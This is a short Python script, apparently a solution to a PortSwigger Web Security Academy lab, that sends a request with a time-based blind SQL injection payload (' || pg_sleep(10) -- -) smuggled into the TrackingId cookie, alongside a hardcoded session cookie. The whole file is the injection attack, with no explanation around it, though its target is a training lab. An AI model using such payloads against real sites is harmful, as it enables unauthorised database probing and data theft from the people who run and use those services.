import requests

url = 'https://acd41fcb1e47175fc0cc4d73002700f9.web-security-academy.net'

response = requests.get(url, cookies={
    'TrackingId': ''' ' || pg_sleep(10) -- - ''',
    'session': 'GkqcZiohj1x6XFO8rQteDIHSJH3SbVXr'
})

print(response.text)